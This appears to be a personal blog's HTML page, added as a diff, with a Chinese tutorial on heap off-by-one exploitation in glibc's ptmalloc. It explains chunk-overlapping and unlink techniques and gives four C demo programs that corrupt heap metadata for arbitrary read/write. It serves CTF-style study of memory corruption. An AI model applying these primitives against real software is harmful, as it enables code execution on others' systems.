@@ -1,0 +1,353 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8" />
+  
+  <title>off-by-one | Another&#39;s blog</title>
+  <meta name="author" content="another" />
+
+  
+  <meta name="description" content="一个字节溢出被称为off-by-one，曾经的一段时间里，off-by-one被认为是不可以利用的，但是后来研究发现在堆上哪怕只有一个字节的溢出也会导致任意代码的执行。同时堆的off-by-one利用也出现在国内外的各类CTF竞赛中，但是在网络上还不能找到一篇系统的介绍堆off-by-one利用的教" />
+  
+
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+  <meta property="og:title" content="off-by-one" />
+  <meta property="og:site_name" content="Another&#39;s blog" />
+
+  
+  
+
+  
+    <meta property="og:image" content="" />
+  
+
+  
+  <link href="/css/images/favicon.ico" rel="icon" />
+  
+
+  <link rel="alternate" href="/atom.xml" title="Another&#39;s blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">Another&#39;s blog</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-10-21T06:01:10.115Z"><a href="/2018/10/21/offbyone/">2018-10-21</a></time>
+      
+      
+  
+    <h1 class="title">off-by-one</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>一个字节溢出被称为off-by-one，曾经的一段时间里，off-by-one被认为是不可以利用的，但是后来研究发现在堆上哪怕只有一个字节的溢出也会导致任意代码的执行。同时堆的off-by-one利用也出现在国内外的各类CTF竞赛中，但是在网络上还不能找到一篇系统的介绍堆off-by-one利用的教程。在这篇文章中我列出了5种常见的堆上的off-by-one攻击方式，并且给出了测试DEMO，测试的环境均为x86。</p>
+<h1 id="达成漏洞利用的条件"><a href="#达成漏洞利用的条件" class="headerlink" title="达成漏洞利用的条件"></a>达成漏洞利用的条件</h1><pre><code>off-by-one并不是全都可以达到利用的目的的。首先就要求堆必须以要求的size+0x4字节（x86）的大小进行分配。如果不满足这个条件那么就无法覆盖到inuse位了。这个是由于堆的字节对齐机制造成的，简单的说堆块是以8字节进行对齐的（x64为16字节）。如果malloc(1024)，那么实际会分配1024+8=1032字节，这一点很好理解。但是如果是malloc(1020)呢，1020+8=1028字节，而1028不满足8字节对齐，那么实际只会分配1020+4=1024字节，多出的4个字节由下一块的prev_size提供空间。
+而对于触发unlink的操作来说，还需要一个额外的附加条件。因为现在的unlink是有检验的，所以需要一个指向堆上的指针才可以。
+</code></pre><h1 id="漏洞利用的效果"><a href="#漏洞利用的效果" class="headerlink" title="漏洞利用的效果"></a>漏洞利用的效果</h1><p>off-by-one能达到什么利用效果呢？<br>这个是很关键的问题。根据分类来看可以实现两种效果</p>
+<h2 id="1-chunk-overlapping"><a href="#1-chunk-overlapping" class="headerlink" title="1.chunk overlapping"></a>1.chunk overlapping</h2><pre><code>所谓的chunk overlapping是指，
+针对一个目标堆块。我们可以通过一些操作，
+使这个目标堆块被我们重新分配到某个我们控制的新的堆块中，
+这样就可以对目标堆块进行任意的读写了。
+</code></pre><h2 id="2-unlink"><a href="#2-unlink" class="headerlink" title="2.unlink"></a>2.unlink</h2><pre><code>这种off-by-one造成的unlink的利用效果其实和溢出造成的unlink的利用效果是一致的。
+对于small bin可以使指向堆的指针ptr的值变为&amp;ptr-0xc，
+这样再结合一系列的操作就可以达成几乎无限次的write-anything-anywhere了。
+</code></pre><p>而large bin的unlink则可以实现一次任意地址写（write-anything-anywhere）。</p>
+<h1 id="堆块格式"><a href="#堆块格式" class="headerlink" title="堆块格式"></a>堆块格式</h1><p>inuse()：仅通过下一块的inuse位来判定当前块是否使用.</p>
+<p>prev_chunk()：如果前一个块为空，那么进行空块合并时，仅使用本块的prev_size来寻找前块的头。</p>
+<p>next_chunk()：仅通过本块头+本块大小的方式来寻找下一块的头</p>
+<p>chunksize()：仅通过本块的size确定本块的大小。</p>
+<h1 id="达成漏洞利用的具体操作"><a href="#达成漏洞利用的具体操作" class="headerlink" title="达成漏洞利用的具体操作"></a>达成漏洞利用的具体操作</h1><h2 id="off-by-one-overwrite-allocated"><a href="#off-by-one-overwrite-allocated" class="headerlink" title="off-by-one overwrite allocated"></a>off-by-one overwrite allocated</h2><p>在这种情况下堆块布局是这样的</p>
+<p>|——————————————————————|<br>|   A   |  B  |    C   |<br>|——————————————————————|<br>    A是发生有off-by-one的堆块，<br>    其中B和C是allocated状态的块。而且C是我们的攻击目标块。<br>    我们的目标是能够读写块C，<br>    那么就应该去构造出这样的内存布局。<br>    然后通过off-by-one去改写块B的size域<br>    （注意要保证inuse域的值为1，否则会触发unlink导致crash）<br>    以实现把C块给整个包含进来。通过把B给free掉，<br>    然后再allocated一个大于B+C的块就可以返回B的地址，并且可以读写块C了。</p>
+<p>具体的操作是：</p>
+<ol>
+<li><p>构成图示的内存布局</p>
+</li>
+<li><p>off-by-one改写B块的size域(增加大小以包含C，inuse位保持1)</p>
+</li>
+<li><p>free掉B块</p>
+</li>
+<li><p>malloc一个B+C大小的块</p>
+</li>
+<li><p>通过返回的地址即可对C任意读写</p>
+</li>
+</ol>
+<pre><code>注意，必须要把C块整个包含进来，否则free时会触发check
+，导致抛出错误。因为ptmalloc实现时的验证逻辑是
+当前块的下一块的inuse必须为1，否则在free时会触发异常，
+这一点本来是为了防止块被double free而做的限制，却给我们伪造堆块造成了障碍。
+</code></pre><h2 id="off-by-one-overwrite-freed"><a href="#off-by-one-overwrite-freed" class="headerlink" title="off-by-one overwrite freed"></a>off-by-one overwrite freed</h2><p>在这种情况下堆块布局依然是这样的</p>
+<p>|——————————————————————|<br>|   A   |  B  |    C   |<br>|——————————————————————|</p>
+<pre><code>A是发生有off-by-one的堆块，
+其中B是free状态的块,C是allocated块。而且C是我们的攻击目标块。
+我们的目标是能够读写块C，
+那么就应该去构造出这样的内存布局。
+然后通过off-by-one去改写块B的size域（注意要保证inuse域的值为1）
+以实现把C块给整个包含进来。但是这种情况下的B是free状态的,
+通过增大B块包含C块，
+然后再allocated一个B+C尺寸的堆块就可以返回B的地址，并且可以读写块C了。
+</code></pre><p>具体的操作是：</p>
+<ol>
+<li><p>构成图示的内存布局</p>
+</li>
+<li><p>off-by-one改写B块的size域(增加大小以包含C，inuse位保持1)</p>
+</li>
+<li><p>malloc一个B+C大小的块</p>
+</li>
+<li><p>通过返回的地址即可对C任意读写</p>
+</li>
+</ol>
+<h2 id="off-by-one-null-byte"><a href="#off-by-one-null-byte" class="headerlink" title="off-by-one null byte"></a>off-by-one null byte</h2><pre><code>这种情况就与上面两种有所不同了，
+在这种情况下溢出的这个字节是一个&apos;\x00&apos;字节。
+这种off-by-one可能是最为常见的
+相比于前两种，这种利用方式就显得更复杂，而且对内存布局的要求也更高了。
+</code></pre><p>首先内存布局需要三个块</p>
+<p>|——————————————————————|<br>|   A   |  B  |    C   |<br>|——————————————————————|</p>
+<pre><code>其中A,B,C都是allocated块，A块发生了null byte off-by-one,
+覆盖了B块的inuse位，使B块伪造为空。
+然后在分配两个稍小的块b1、b2，根据ptmalloc的实现，
+这两个较小块（不能是fastbin）会分配在B块中。
+然后只要释放掉b1，再释放掉C，就会引发从原B块到C的合并。
+那么只要重新分配原B大小的chunk，就会重新得到b2。
+在这个例子中，b2是我们要进行读写的目标堆块。最后的堆块布局如下所示：
+</code></pre><p>|——————————————————————|<br>|   A |B1|B2| |    C   |<br>|——————————————————————|<br>布局堆块结构如ABC所示</p>
+<ol>
+<li><p>off-by-one覆盖B，目的是覆盖掉B的inuse位</p>
+</li>
+<li><p>free B</p>
+</li>
+<li><p>malloc b1,malloc b2</p>
+</li>
+<li><p>free C</p>
+</li>
+<li><p>free b1</p>
+</li>
+<li><p>malloc B</p>
+</li>
+<li><p>overlapping b2</p>
+</li>
+</ol>
+<p>这种利用方式成功的原因有两点:</p>
+<p>通过prev_chunk()宏查找前块时没有对size域进行验证</p>
+<p>当B块的size域被伪造后，下一块的pre_size域无法得到更新。</p>
+<h1 id="off-by-one-small-bin"><a href="#off-by-one-small-bin" class="headerlink" title="off-by-one small bin"></a>off-by-one small bin</h1><p>|——————————————————————|<br>|   A      |     B     |<br>|——————————————————————|</p>
+<pre><code>这种方法是要触发unlink宏，
+因此需要一个指向堆上的指针来绕过fd和bk链表的check。
+需要在A块上构造一个伪堆结构，
+然后覆盖B的pre_size域和inuse域。这样当我们free B时，
+就会触发unlink宏导致指向堆上的指针
+ptr的值被改成&amp;ptr-0xC(x64下为&amp;ptr-0x18)。
+通过这个特点，我们可以覆写ptr指针，如果条件允许的话，
+几乎可以造成无限次的write-anything-anywhere。
+</code></pre><ol>
+<li><p>在A块中构造伪small bin结构，并且修改B块的prev_size域和inuse域。</p>
+</li>
+<li><p>free B块</p>
+</li>
+<li><p>ptr指针被改为&amp;ptr-0xC</p>
+</li>
+</ol>
+<h2 id="off-by-one-large-bin"><a href="#off-by-one-large-bin" class="headerlink" title="off-by-one large bin"></a>off-by-one large bin</h2><p>large bin通过unlink造成write-anything-anywhere的利用方法最早出现于Google的Project Zero项目的一篇文章中，具体链接是</p>
+<p><a href="https://googleprojectzero.blogspot.fr/2014/08/the-poisoned-nul-byte-2014-edition.html" target="_blank" rel="noopener">https://googleprojectzero.blogspot.fr/2014/08/the-poisoned-nul-byte-2014-edition.html</a></p>
+<p>在这篇文章中，提出了large bin检验仅仅是通过assert断言的形式来进行的，并不能真正的对漏洞进行有效的防护。但是经过我的测试发现，目前版本的ubuntu和CentOS已经均具备有检测large unlink的能力，如果发现存在指针被篡改的情况，则会抛出“corrupted double-linked list(not small)”的错误，之后翻阅了一下glibc中ptmalloc部分的实现代码却并没有发现有检测这部分的代码，猜测大概是后续版本中加入的。因为这种利用方式的意义已经不是很大，这里就不在详细列出步骤也不提供测试DEMO了。</p>
+<h1 id="测试DEMO"><a href="#测试DEMO" class="headerlink" title="测试DEMO"></a>测试DEMO</h1><h1 id="1-off-by-one-overwrite-allocated"><a href="#1-off-by-one-overwrite-allocated" class="headerlink" title="1.off-by-one overwrite allocated"></a>1.off-by-one overwrite allocated</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">253</span>]=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">void</span> *A,*B,*C;</span><br><span class="line">    <span class="keyword">void</span> *Overlapped;</span><br><span class="line">     </span><br><span class="line">    A=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">    B=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">    C=<span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'a'</span>,<span class="number">252</span>);</span><br><span class="line">    buf[252]='\x89';  //把C块包含进来</span><br><span class="line">    <span class="built_in">memcpy</span>(A,buf,<span class="number">253</span>);<span class="comment">//A存在off-by-one漏洞</span></span><br><span class="line">     </span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    Overlapped=<span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这段代码演示了通过off-by-one对C块实施了overlapping。通过返回的变量Overlapped就可以对C块进行任意的读写了。</p>
+<h2 id="2-off-by-one-overwrite-freed"><a href="#2-off-by-one-overwrite-freed" class="headerlink" title="2.off-by-one overwrite freed"></a>2.off-by-one overwrite freed</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">253</span>]=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">void</span> *A,*B,*C;</span><br><span class="line">    <span class="keyword">void</span> *Overlapped;</span><br><span class="line">     </span><br><span class="line">    A=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">    B=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">    C=<span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'a'</span>,<span class="number">252</span>);</span><br><span class="line">    buf[252]='\x89';</span><br><span class="line">    <span class="built_in">memcpy</span>(A,buf,<span class="number">253</span>);<span class="comment">//A存在off-by-one漏洞</span></span><br><span class="line">   </span><br><span class="line">    Overlapped=<span class="built_in">malloc</span>(<span class="number">380</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个DEMO与上面的类似，同样可以overlapping后面的块C，导致可以对C进行任意读写。</p>
+<h2 id="3-off-by-one-null-byte"><a href="#3-off-by-one-null-byte" class="headerlink" title="3.off-by-one null byte"></a>3.off-by-one null byte</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *A,*B,*C;</span><br><span class="line">    <span class="keyword">void</span> *B1,*B2;</span><br><span class="line">    <span class="keyword">void</span> *Overlapping;</span><br><span class="line">    A=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    B=<span class="built_in">malloc</span>(<span class="number">0x208</span>);</span><br><span class="line">    C=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    ((char *)A)[0x104]='\x00';</span><br><span class="line">    B1=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    B2=<span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">free</span>(B1);</span><br><span class="line">    <span class="built_in">free</span>(C);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x200</span>);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以成功的对B2进行任意读写。</p>
+<h2 id="4-off-by-one-small-bin"><a href="#4-off-by-one-small-bin" class="headerlink" title="4.off-by-one small bin"></a>4.off-by-one small bin</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *ptr;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> prev_size,size,fd,bk;</span><br><span class="line">    <span class="keyword">void</span> *p1,*p2;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">253</span>]=<span class="string">""</span>;</span><br><span class="line">   </span><br><span class="line">    p1=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">    p2=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">   </span><br><span class="line">    ptr=p1;</span><br><span class="line">    prev_size=<span class="number">0</span>;</span><br><span class="line">    size=<span class="number">249</span>;</span><br><span class="line">    fd=(<span class="keyword">int</span>)(&amp;ptr)<span class="number">-0xC</span>;</span><br><span class="line">    bk=(<span class="keyword">int</span>)(&amp;ptr)<span class="number">-0x8</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'c'</span>,<span class="number">253</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf,&amp;prev_size,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf+<span class="number">4</span>,&amp;size,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf+<span class="number">8</span>,&amp;fd,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf+<span class="number">12</span>,&amp;bk,<span class="number">4</span>);</span><br><span class="line">    size=<span class="number">248</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;buf[<span class="number">248</span>],&amp;size,<span class="number">4</span>);</span><br><span class="line">    buf[252]='\x00';</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">memcpy</span>(p1,buf,<span class="number">253</span>);</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个DEMO中使用了一个指向堆上的指针ptr，ptr是全局变量处于bss段上。通过重复写ptr值即可实现write-anything-anywhere。</p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  
+
+  
+<div class="widget tag">
+  <h3 class="title">archives</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2018/10/21/线下赛/">线下赛</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/漏洞挖掘/">漏洞挖掘</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/文件读写内存实例/">文件读写内存实例</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/堆溢出/">堆溢出</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/分布式/">分布式搭建</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/内核编译/">内核编译</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/关闭nx与反弹shell/">关闭nx与反弹shell</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/两道内核/">两道内核</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/windows机制/">windows机制</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/windbg学习总结/">windbg学习总结</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/web/">随意码的web</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/sulb/">slub</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/rtd/">return to dl-resolve</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/pwnable.tw/">pwnable.tw总结</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/patch/">patch</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/offbyone/">off-by-one</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/hor/">House-Of-Rabbit</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/hfo/">house-of-orange</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/hexo/">搭建博客</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/glibc malloc和free/">glibc malloc和free</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/doublefree/">double free</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/brop/">brop</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/bpf/">bpf</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/afl/">afl</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  
+
+  
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  <p>
+  
+  &copy; 2018 another
+  
+  All rights reserved.</p>
+  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</div>
+<div class="clearfix"></div>
+
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script></footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+<div id='bg'></div>
+</body>
+</html>
